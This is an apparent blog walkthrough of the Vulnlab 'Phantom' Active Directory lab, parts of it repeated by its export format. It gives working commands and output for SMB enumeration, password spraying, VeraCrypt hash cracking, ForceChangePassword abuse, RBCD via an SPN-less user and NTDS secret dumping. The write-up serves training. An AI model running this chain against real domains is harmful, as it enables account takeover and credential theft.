title=\"Email Foothold\"></a>Email Foothold</h1><p>Since we have enumerated access to a few of the SMB shares, we can see specifically if any of them contain any files that we have read access on.</p>\n<p>We don’t have access to the <code>Department Share</code> as a null user, and <code>SYSVOL</code>&#x2F;<code>NETLOGON</code> don’t seem to have anything of use either. Let’s look at the <code>Public</code> share.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient \\\\\\\\10.10.103.169\\\\Public -N            </span><br><span class=\"line\">Try &quot;help&quot; to get a list of possible commands.</span><br><span class=\"line\">smb: \\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Thu Jul 11 11:03:14 2024</span><br><span class=\"line\">  ..                                DHS        0  Sun Jul  7 04:39:30 2024</span><br><span class=\"line\">  tech_support_email.eml              A    14565  Sat Jul  6 12:08:43 2024</span><br><span class=\"line\"></span><br><span class=\"line\">6127103 blocks of size 4096. 1085569 blocks available</span><br><span class=\"line\">smb: \\&gt; get tech_support_email.eml </span><br><span class=\"line\">getting file \\tech_support_email.eml of size 14565 as tech_support_email.eml (28.2 KiloBytes/sec) (average 28.2 KiloBytes/sec)</span><br></pre></td></tr></table></figure>\n\n<p>There seems to be a <code>.eml</code> file within this directory, containing a message from what seems to be tech support. A base64 encoded attachment was provided in this email, though it is unintelligible from our perspective on Linux (if we try to decode it with basic tools). I instead opted to copy it to my Windows host and open it through Outlook.</p>\n<p><img src=\"/images/vulnlab/phantom-vl/b.png\"></p>\n<p>It seems that a basic password is provided for new users with this tech support document. This should be the default password for new users that are onboarded, so we can potentially test this against the user list that we currently have.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap 10.10.103.169 -u full_ul.txt -p &#x27;(EMAIL PASSWORD)&#x27; --continue-on-success</span><br><span class=\"line\">......</span><br><span class=\"line\">LDAP        10.10.103.169   389    DC               [+] phantom.vl\\ibryant:(EMAIL PASSWORD)</span><br></pre></td></tr></table></figure>\n\n<p>You’ll receive a few false positives when testing these credentials against the domain, as denoted by the unsuccessful bind message under each false positive.</p>\n<p>That being said, a user&#x2F;password match did seem to return within a successful bind for <code>ibryant</code>. Since they are successfully able to authenticate to LDAP, we can dump the domain using Bloodhound and the <a href=\"https://github.com/dirkjanm/BloodHound.py\">Python ingestor</a>. </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ bloodhound-python -d &#x27;phantom.vl&#x27; -u &#x27;ibryant&#x27; -p &#x27;(IBRYANT PASSWORD)&#x27; -c all -ns 10.10.103.169 --zip</span><br><span class=\"line\">INFO: Compressing output into 20240713234621_bloodhound.zip</span><br></pre></td></tr></table></figure>\n\n<p>After booting up Bloodhound and checking out our user’s node, it does not seem that we have any outbound object controls&#x2F;privileges over any other domain objects. Having the Bloodhound graph is still helpful for us later down the attack path for other users we compromise.</p>\n<p>I was able to find out after some password usage against SMB that we now have access to the <code>Department Share</code> SMB share with <code>ibryant</code>. Let’s see what we can find within this share.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient \\\\\\\\10.10.103.169\\\\Departments\\ Share -U &#x27;ibryant&#x27;</span><br><span class=\"line\">Password for [WORKGROUP\\ibryant]:</span><br><span class=\"line\">Try &quot;help&quot; to get a list of possible commands.</span><br><span class=\"line\">smb: \\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Sat Jul  6 12:25:31 2024</span><br><span class=\"line\">  ..                                DHS        0  Sun Jul  7 04:39:30 2024</span><br><span class=\"line\">  Finance                             D        0  Sat Jul  6 12:25:11 2024</span><br><span class=\"line\">  HR                                  D        0  Sat Jul  6 12:21:31 2024</span><br><span class=\"line\">  IT                                  D        0  Thu Jul 11 10:59:02 2024</span><br><span class=\"line\"></span><br><span class=\"line\">6127103 blocks of size 4096. 1178542 blocks available</span><br></pre></td></tr></table></figure>\n\n<p>I did some spidering on this share, and it seems that there is notably a bit of information for the next exploit within the <code>IT</code> directory.</p>\n<h1 id=\"Cracking-VeraCrypt-Volume-Passwords\"><a href=\"#Cracking-VeraCrypt-Volume-Passwords\" class=\"headerlink\" title=\"Cracking VeraCrypt Volume Passwords\"></a>Cracking VeraCrypt Volume Passwords</h1><p>Within this directory, exists a <code>veracrypt</code> Linux installation package along with a few other programs such as <code>TeamViewer</code> and <code>mRemoteNG</code>.</p>\n<p>Within the <code>Backups</code> directory in this folder, seems to be a file with a <code>.hc</code> extension.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">smb: \\IT\\&gt; cd Backup</span><br><span class=\"line\">smb: \\IT\\Backup\\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Sat Jul  6 14:04:34 2024</span><br><span class=\"line\">  ..                                  D        0  Thu Jul 11 10:59:02 2024</span><br><span class=\"line\">  IT_BACKUP_201123.hc                 A 12582912  Sat Jul  6 14:04:14 2024</span><br><span class=\"line\"></span><br><span class=\"line\">6127103 blocks of size 4096. 1178408 blocks available</span><br></pre></td></tr></table></figure>\n\n<p>Doing some research on this file led me to interpret that this was an encrypted VeraCrypt volume. VeraCrypt in particular is an open disk encryption application that allows for further protection against files and filesystems, locking them behind encryption algorithms.</p>\n<p>The encryption volume that we seem to have on our hands is a volume&#x2F;filesystem related to an IT backup that the IT team (presumably the team the <code>ibryant</code> is being onboarded to) had previously conducted on <code>July 6</code>.</p>\n<p>I set up <code>veracrypt</code> locally on my Kali machine, you could use the installation package that is within the <code>IT</code> directory or install it from the <a href=\"https://veracrypt.eu/en/Downloads.html\">VeraCrypt</a> website.</p>\n<p><img src=\"/images/vulnlab/phantom-vl/c.png\"></p>\n<p>It seems that we’ll need to use a password or keyfile in order to mount this volume. This is one of the main security features that VeraCrypt offers, so we’ll need to find the password to mount it.</p>\n<p>I did a bit of enumeration on the file share, and it doesn’t seem that anything points towards a password that we could use. Password reusage from passwords such as <code>ibryant</code>‘s password also does not seem to result in anything success. At this point - we could potentially brute force for this password, though we don’t have much to build off of in terms of a password policy that these users might set this to. </p>\n<p>Luckily enough, <code>hashcat</code> offers a numerous amount of VeraCrypt hash cracking algorithms. The default encryption algorithm that VeraCrypt can use is <code>AES/SHA512 (legacy)</code>, which has a hash ID of 13721.</p>\n<p>Next, we’ll need to define a rule for our password brute force. If we think about it from a real-world sense, there are common password policies that involve simple password mutation, such as date-of-birth or the users last name. Passwords also generally involve a few special characters and a capital letter.</p>\n<p>The password mutation I decided to try in particular consisted of the following password attributes. The Wiki hint also solidifies this factor on the <a href=\"https://wiki.vulnlab.com/guidance/medium/phantom\">machine’s page</a>.</p>\n<ul>\n<li>Capital letter, preferably the first alphanumeric character in the password.</li>\n<li>Company&#x2F;Machine name.</li>\n<li>Year, can revolve of any permutation from 2022-2024 (based on the current year).</li>\n<li>Special character (any)</li>\n</ul>\n<p>I started by creating a wordlist based on common strings from the machine name, ending up with a result such as this.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ cat phantom.txt             </span><br><span class=\"line\">phantom</span><br><span class=\"line\">Phantom</span><br><span class=\"line\">PHANTOM</span><br><span class=\"line\">PHANT0M</span><br><span class=\"line\">phant0m</span><br><span class=\"line\">phantom.vl</span><br><span class=\"line\">PHANTOM.VL</span><br><span class=\"line\">phant0m.vl</span><br><span class=\"line\">PHANT0M.vl</span><br><span class=\"line\">Ph4nt0m</span><br><span class=\"line\">PH4NT0M</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have our hash ID and our wordlist, the last thing that we’ll need is our hashcat rule. I created a simple rule file that hashcat could parse based off of the expressions that it uses. In a rule file, you can generally state the ruleset appended to the end of each string in your wordlist like this.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ cat phantom.rule </span><br><span class=\"line\">$2 $0 $2 $3 $$</span><br><span class=\"line\">$2 $0 $2 $3 $&amp;</span><br><span class=\"line\">$2 $0 $2 $3 $@</span><br><span class=\"line\">$2 $0 $2 $3 $!</span><br><span class=\"line\">$2 $0 $2 $3 $#</span><br><span class=\"line\">$2 $0 $2 $3 $%</span><br><span class=\"line\">$2 $0 $2 $3 $^</span><br><span class=\"line\">$2 $0 $2 $3 $*</span><br><span class=\"line\">$2 $0 $2 $3 $(</span><br><span class=\"line\">$2 $0 $2 $3 $)</span><br><span class=\"line\">$2 $0 $2 $3 $-</span><br><span class=\"line\">$2 $0 $2 $3 $_</span><br><span class=\"line\">$2 $0 $2 $3 $=</span><br><span class=\"line\">$2 $0 $2 $3 $+</span><br></pre></td></tr></table></figure>\n\n<p>This essentially states that each string will be appended by the year <code>2023</code> along with each special character on a regular keyboard (or at least most of them).</p>\n<p>Now that we have all of the components needed, we can proceed with our hash cracking. By default, the first 512 bytes of an encrypted VeraCrypt volume contain the password of the volume, however <code>hashcat</code> can parse this out if we give it the raw volume.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ hashcat -a 0 -m 13721 IT_BACKUP_201123.hc phantom.txt -r phantom.rule </span><br><span class=\"line\">hashcat (v6.2.6) starting</span><br><span class=\"line\">......</span><br><span class=\"line\">IT_BACKUP_201123.hc:[...snip...]                         </span><br><span class=\"line\"></span><br><span class=\"line\">Session..........: hashcat</span><br><span class=\"line\">Status...........: Cracked</span><br><span class=\"line\">Hash.Mode........: 13721 (VeraCrypt SHA512 + XTS 512 bit (legacy))</span><br><span class=\"line\">Hash.Target......: IT_BACKUP_201123.hc</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, we were successfully able to crack the hash for the volume and can now mount the volume. The method that we used can be seen in real-world situations, so it was nice to test out and can really get you thinking on how a person might think to create a password.</p>\n<p>Now that we have the password, we should be able to mount the volume to a location on our local system to see its contents.</p>\n<p><img src=\"/images/vulnlab/phantom-vl/d.png\"></p>\n<p>As you can see, it was saved under <code>/media/veracrypt1</code>.</p>\n<h1 id=\"Credential-Hunting\"><a href=\"#Credential-Hunting\" class=\"headerlink\" title=\"Credential Hunting\"></a>Credential Hunting</h1><p>Given that <code>veracrypt</code> only allocates a relatively small amount of storage to this mount (you may see a few full storage errors), we can simply copy all of the contents of this mount to a directory within our <code>/</code> filesystem. You can do so easily with <code>sudo cp -r * (DESIRED FILEPATH)</code>.</p>\n<p>Doing some enumeration on the volume brought me to an interesting file that contained a password for a user.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">vpn &#123;</span><br><span class=\"line\">    sstp &#123;</span><br><span class=\"line\">        authentication &#123;</span><br><span class=\"line\">            local-users &#123;</span><br><span class=\"line\">                username lstanley &#123;</span><br><span class=\"line\">                    password &quot;[...snip...]&quot;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br></pre></td></tr></table></figure>\n\n<p>If you unzip and decompress all of the archives within the volume you mounted, this will be within <code>/config/archive/config.boot</code>. It seems that after a bit of credential hunting, we were able to retrieve the password to the <code>lstanley</code> user.</p>\n<p>While we would assume this would be for their user, I decided to run a <code>crackmapexec</code> scan against the full user list that we have just in case it belongs to other users instead of <code>lstanley</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap 10.10.103.169 -u full_ul.txt -p &#x27;[...snip...]&#x27; --continue-on-success</span><br><span class=\"line\">......</span><br><span class=\"line\">LDAP        10.10.103.169   389    DC               [+] phantom.vl\\svc_sspr:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>It seems that a successful password match was found for <code>svc_sspr</code>.</p>\n<p>I also made sure to run this against WinRM, and it seems that this user is part of the <code>Remote Management Users</code> group.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec winrm 10.10.103.169 -u svc_sspr -p &#x27;[...snip...]&#x27;</span><br><span class=\"line\">SMB         10.10.103.169   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:phantom.vl)</span><br><span class=\"line\">HTTP        10.10.103.169   5985   DC               [*] http://10.10.103.169:5985/wsman</span><br><span class=\"line\">WINRM       10.10.103.169   5985   DC               [+] phantom.vl\\svc_sspr:[...snip...] (Pwn3d!)</span><br></pre></td></tr></table></figure>\n\n<p>This means we should be able to authenticate to WinRM using <code>evil-winrm</code> and read the first flag.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ evil-winrm --ip 10.10.103.169 -u &#x27;svc_sspr&#x27; -p &#x27;[...snip...]&#x27;</span><br><span class=\"line\">Evil-WinRM shell v3.5</span><br><span class=\"line\">Info: Establishing connection to remote endpoint</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\svc_sspr\\Documents&gt; cat ..\\Desktop\\user.txt</span><br><span class=\"line\">VL[...snip...]</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Domain-Escalation-as-svc-sspr\"><a href=\"#Domain-Escalation-as-svc-sspr\" class=\"headerlink\" title=\"Domain Escalation as svc_sspr\"></a>Domain Escalation as svc_sspr</h1><p>Now that we successfully have access to the machine - we could look around the filesystem to see if there are any pertinent files&#x2F;applications that we could exploit. Below is a list of security checks that I performed to see if the filesystem possessed any important data.</p>\n<ul>\n<li>Cached DPAPI credentials&#x2F;master keys with <code>Seatbelt</code>.</li>\n<li>Internal services using <code>netstat</code>.</li>\n<li>Abnormal running programs with <code>ps</code>.</li>\n<li>Credential Hunting on the filesystem.</li>\n<li>Regular privilege escalation tactics with tools such as <code>PrivescCheck</code> and <code>Winpeas</code>.</li>\n</ul>\n<p>Though nothing seemed to come back with any successful results. I decided to turn my attention back to our Bloodhound graph to see if our user had any privileges over any other domain objects.</p>\n<p><img src=\"/images/vulnlab/phantom-vl/e.png\"></p>\n<p>It seems as though <code>svc_sspr</code> has <code>ForceChangePassword</code> set over three domain users. This attribute essentially allows us to change the password of the domain user to any string of our choosing. This will allow us to take full control over this domain user and exploit any privileges that they have,</p>\n<p>We can easily do so through RPC.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ net rpc password &quot;crose&quot; &quot;Password123@&quot; -U &quot;phantom.vl&quot;/&quot;svc_sspr&quot;%&quot;(SVC_SSPR PASSWORD)&quot; -S &quot;dc.phantom.vl&quot;</span><br></pre></td></tr></table></figure>\n\n<p>This should of theoretically changed the password for the user <code>crose</code>, and we can verify so in LDAP.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap 10.10.103.169 -u crose -p &#x27;Password123@&#x27;                   </span><br><span class=\"line\">SMB         10.10.103.169   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.103.169   389    DC               [+] phantom.vl\\crose:Password123@</span><br></pre></td></tr></table></figure>\n\n<p>Looks like it works, we now possess the password for this user. They don’t seem to have the ability to authenticate to the filesystem, so our privilege escalation must still be through the domain.</p>\n<p><img src=\"/images/vulnlab/phantom-vl/f.png\"></p>\n<p>It seems that this user, <code>crose</code>, is within the <code>ICT Security</code> domain group. This means that by default, they have <code>AllowedToActOnBehalfOfOtherIdentity</code> privilege over the domain controller, <code>DC.PHANTOM.VL</code>.</p>\n<p>This privilege essentially allows us to act on behalf of the domain controller, and request for service tickets on behalf of that domain computer. This privilege in particular allows us to exploit RBCD (resource-based constrained delegation), which can allow us to compromise the domain controller. We’ve done this exploit in the past on other machines, and it seems as though this is the same type of attack path here.</p>\n<h1 id=\"RBCD-Through-SPN-less-User\"><a href=\"#RBCD-Through-SPN-less-User\" class=\"headerlink\" title=\"RBCD Through SPN-less User\"></a>RBCD Through SPN-less User</h1><p>However, there is one primary issue that we face for this machine. Our domain user has a MAQ of 0, meaning they cannot create domain computers that are needed for exploiting RBCD. </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap 10.10.103.169 -u crose -p &#x27;Password123@&#x27; -M maq</span><br><span class=\"line\">SMB         10.10.103.169   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.103.169   389    DC               [+] phantom.vl\\crose:Password123@ </span><br><span class=\"line\">MAQ         10.10.103.169   389    DC               [*] Getting the MachineAccountQuota</span><br><span class=\"line\">MAQ         10.10.103.169   389    DC               MachineAccountQuota: 0</span><br></pre></td></tr></table></figure>\n\n<p>Furthermore, all of the users that we’ve previously had access to have a MAQ of 0, and there doesn’t seem to be any other users that we can escalate our privileges to. (This is due to the fact that the three users that we can compromise as <code>svc_sspr</code> are the only domain users that seem to have outbound object control rights over another object)</p>\n<p>Normally this would be as far as you’d be able to get, but there is actually something that we can exploit given that we have the <code>AllowedToActOn</code> attribute against the DC.</p>\n<p>Credit goes out to the article found <a href=\"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd\">here</a> and<a href=\"https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html\"> here</a> discovered by <a href=\"https://x.com/tiraniddo\">James Forshaw</a>. There is actually a method that we can use to exploit RBCD, though it involves finding our current users ticket session key along with changing their current password to that key.</p>\n<p>At a low-level, if we are able to obtain the ticket session key and change that key to be the password hash of our controlled user, we can utilize User-2-User authentication to trick the DC into delegating a service ticket to us. We can combine both U2U and S4U2Proxy to obtain this ticket, and then use it to dump the LSA secrets of the domain controller. This is due to how the KDC interprets ticket session keys that are passed in as NT hashes for a user, allowing them to be treated as computer objects in a sense.</p>\n<p>So to start, we’ll get the current TGT of the user in order to discover the ticket session key.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-getTGT -hashes :$(pypykatz crypto nt &#x27;Password123@&#x27;) phantom.vl/crose </span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Saving ticket in crose.ccache</span><br></pre></td></tr></table></figure>\n\n<p>We can then use <a href=\"https://github.com/fortra/impacket/blob/master/examples/describeTicket.py\">describeTicket.py</a> to obtain the ticket session key based on the service ticket for this user. (Note that the ticket session key will be different for your instance of this machine)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 describeTicket.py crose.ccache | grep &#x27;Ticket Session Key&#x27;</span><br><span class=\"line\">[*] Ticket Session Key            : 4abd87ab347a96df9a497689a79bfd5c</span><br></pre></td></tr></table></figure>\n\n<p>Now let’s change the user’s password once more to match the hash of the ticket session key that we just received.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-smbpasswd -newhashes :4abd87ab347a96df9a497689a79bfd5c phantom.vl/crose:&#x27;Password123@&#x27;@dc.phantom.vl</span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">===============================================================================</span><br><span class=\"line\">  Warning: This functionality will be deprecated in the next Impacket version  </span><br><span class=\"line\">===============================================================================</span><br><span class=\"line\"></span><br><span class=\"line\">[*] NTLM hashes were changed successfully.</span><br></pre></td></tr></table></figure>\n\n<p>Now that the NTLM hash was set with the same value of our ticket session key, we should be able to use RBCD as intended.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-rbcd -delegate-from &#x27;crose&#x27; -delegate-to &#x27;DC$&#x27; -dc-ip 10.10.103.169 -action &#x27;write&#x27; &#x27;phantom.vl&#x27;/&#x27;crose&#x27; -hashes :4abd87ab347a96df9a497689a79bfd5c</span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty</span><br><span class=\"line\">[*] Delegation rights modified successfully!</span><br><span class=\"line\">[*] crose can now impersonate users on DC$ via S4U2Proxy</span><br><span class=\"line\">[*] Accounts allowed to act on behalf of other identity:</span><br><span class=\"line\">[*]     crose        (S-1-5-21-4029599044-1972224926-2225194048-1126)</span><br></pre></td></tr></table></figure>\n\n<p>Now that the account is able to delegate on behalf of the DC, we can request a service ticket as we normally would with our controlled user. The only difference here is that we’ll use the <code>-u2u</code> option so that the KDC interprets our login attempt as a domain user authentication attempt. We’ll also impersonate the Administrator account so that we can dump the secrets of the domain controller.</p>\n<p>Make sure to set your Kerberos global authentication variable to the <code>crose</code> ticket that we produced earlier.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ export KRB5CCNAME=crose.ccache</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ impacket-getST -u2u -impersonate Administrator -spn &#x27;cifs/dc.phantom.vl&#x27; -k -no-pass phantom.vl/&#x27;crose&#x27;</span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Impersonating Administrator</span><br><span class=\"line\">[*] Requesting S4U2self+U2U</span><br><span class=\"line\">[*] Requesting S4U2Proxy</span><br><span class=\"line\">[*] Saving ticket in Administrator@cifs_dc.phantom.vl@PHANTOM.VL.ccache</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have a service ticket for the Administrator user, we can dump the secrets of the domain controller with <code>impacket-secretsdump</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ export KRB5CCNAME=Administrator@cifs_dc.phantom.vl@PHANTOM.VL.ccache</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ impacket-secretsdump -k dc.phantom.vl</span><br><span class=\"line\">......</span><br><span class=\"line\">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class=\"line\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::</span><br></pre></td></tr></table></figure>\n\n<p>Note that the local SAM hash for the Administrator account will not work if you try to PTH. The extracted Administrator hash from the domain credential dump should have the hash you are looking for.</p>\n<p>As seen from the above, we were able to pull the Administrator NT hash and can now use it to authenticate to the machine through WinRM.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ evil-winrm --ip 10.10.103.169 -u &#x27;Administrator&#x27; -H &#x27;[...snip...]&#x27;</span><br><span class=\"line\">Evil-WinRM shell v3.5  </span><br><span class=\"line\">Info: Establishing connection to remote endpoint</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; cat ..\\Desktop\\root.txt</span><br><span class=\"line\">VL[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>Now that we were able to read the root flag, this means that we have successfully compromised this machine!</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This machine was relatively difficult when it came to problem-solving, as you needed to have a grasp of how password creation was conceived in general by regular users in the real-world. Though this may not be a situation you’ll see a lot, it is always something that is good to test for. The AD portion was also really interesting, as prior to this machine I did not know you could exploit RBCD when a user does not have control over a domain computer.</p>\n<p>Big props to ar0x4, this machine was great.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://github.com/dirkjanm/BloodHound.py\">https://github.com/dirkjanm/BloodHound.py</a><br><a href=\"https://veracrypt.eu/en/Downloads.html\">https://veracrypt.eu/en/Downloads.html</a><br><a href=\"https://wiki.vulnlab.com/guidance/medium/phantom\">https://wiki.vulnlab.com/guidance/medium/phantom</a><br><a href=\"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd\">https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd</a><br><a href=\"https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html\">https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html</a><br><a href=\"https://x.com/tiraniddo\">https://x.com/tiraniddo</a><br><a href=\"https://github.com/fortra/impacket/blob/master/examples/describeTicket.py\">https://github.com/fortra/impacket/blob/master/examples/describeTicket.py</a></p>\n","cover_type":"img","excerpt":"","more":"<p>Phantom is the latest machine that was released as of 7&#x2F;13&#x2F;2024. This machine involved Active Directory penetration testing along with some password decryption paths. I originally tried going for first blood on this machine, however the encryption portion was a little difficult for me and I ended up completing it a couple of days later. Cheers and thanks to the people that I worked alongside for this machine - you know who you are.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Let’s run an NMAP scan, our entry point to the domain controller is <code>10.10.103.169</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ sudo nmap 10.10.103.169</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-11 14:01 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.103.169</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 988 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">53/tcp   open  domain</span><br><span class=\"line\">88/tcp   open  kerberos-sec</span><br><span class=\"line\">135/tcp  open  msrpc</span><br><span class=\"line\">139/tcp  open  netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">464/tcp  open  kpasswd5</span><br><span class=\"line\">593/tcp  open  http-rpc-epmap</span><br><span class=\"line\">636/tcp  open  ldapssl</span><br><span class=\"line\">3269/tcp open  globalcatLDAPssl</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\">5357/tcp open  wsdapi</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 17.87 seconds</span><br></pre></td></tr></table></figure>\n\n<p>It seems to be a relatively standard AD machine. I doubt we’ll need to be doing any web-app testing for this, as there does not seem to be any web ports open. The domain is <code>phantom.vl</code> and the DC DNS name is <code>dc.phantom.vl</code>, so we’ll add these to our <code>/etc/hosts</code> file for later use.</p>\n<p>We’ll start with SMB first to see if there are anything we can pull from the shares.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient -L 10.10.103.169 -N         </span><br><span class=\"line\"></span><br><span class=\"line\">        Sharename       Type      Comment</span><br><span class=\"line\">        ---------       ----      -------</span><br><span class=\"line\">        ADMIN$          Disk      Remote Admin</span><br><span class=\"line\">        C$              Disk      Default share</span><br><span class=\"line\">        Departments Share Disk      </span><br><span class=\"line\">        IPC$            IPC       Remote IPC</span><br><span class=\"line\">        NETLOGON        Disk      Logon server share </span><br><span class=\"line\">        Public          Disk      </span><br><span class=\"line\">        SYSVOL          Disk      Logon server share </span><br><span class=\"line\">Reconnecting with SMB1 for workgroup listing.</span><br><span class=\"line\">do_connect: Connection to 10.10.103.169 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class=\"line\">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>\n\n<p>It seems that we have access to SMB through null authentication, and we are able to view a few of the shares that are available on the machine.</p>\n<p>This is an immediate pivot to Kerberos, as we can essentially brute force all of the domain SIDs (including domain users) through <code>lookupsid</code> due to the fact that we can login to SMB without a password and view the shares.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-lookupsid -domain-sids -no-pass -target-ip 10.10.103.169 phantom.vl/&#x27;daz&#x27;@10.10.103.169</span><br></pre></td></tr></table></figure>\n\n<p>This should return a list of all of the SIDs, some of which are domain users. We can easily convert this into a user list using some filtering and basic regex. </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-lookupsid -domain-sids -no-pass -target-ip 10.10.103.169 phantom.vl/&#x27;daz&#x27;@10.10.103.169 | cut -d &#x27;\\&#x27; -f 2 | awk &#x27;NR &gt;= 29 &#123;print $1&#125;&#x27; &gt; full_ul.txt</span><br></pre></td></tr></table></figure>\n\n<p>This should convert the respective domain users (including a few false positives) into a list. We’ll be able to use this once we receive a password for a user.</p>\n<h1 id=\"Email-Foothold\"><a href=\"#Email-Foothold\" class=\"headerlink\" title=\"Email Foothold\"></a>Email Foothold</h1><p>Since we have enumerated access to a few of the SMB shares, we can see specifically if any of them contain any files that we have read access on.</p>\n<p>We don’t have access to the <code>Department Share</code> as a null user, and <code>SYSVOL</code>&#x2F;<code>NETLOGON</code> don’t seem to have anything of use either. Let’s look at the <code>Public</code> share.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient \\\\\\\\10.10.103.169\\\\Public -N            </span><br><span class=\"line\">Try &quot;help&quot; to get a list of possible commands.</span><br><span class=\"line\">smb: \\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Thu Jul 11 11:03:14 2024</span><br><span class=\"line\">  ..                                DHS        0  Sun Jul  7 04:39:30 2024</span><br><span class=\"line\">  tech_support_email.eml              A    14565  Sat Jul  6 12:08:43 2024</span><br><span class=\"line\"></span><br><span class=\"line\">6127103 blocks of size 4096. 1085569 blocks available</span><br><span class=\"line\">smb: \\&gt; get tech_support_email.eml </span><br><span class=\"line\">getting file \\tech_support_email.eml of size 14565 as tech_support_email.eml (28.2 KiloBytes/sec) (average 28.2 KiloBytes/sec)</span><br></pre></td></tr></table></figure>\n\n<p>There seems to be a <code>.eml</code> file within this directory, containing a message from what seems to 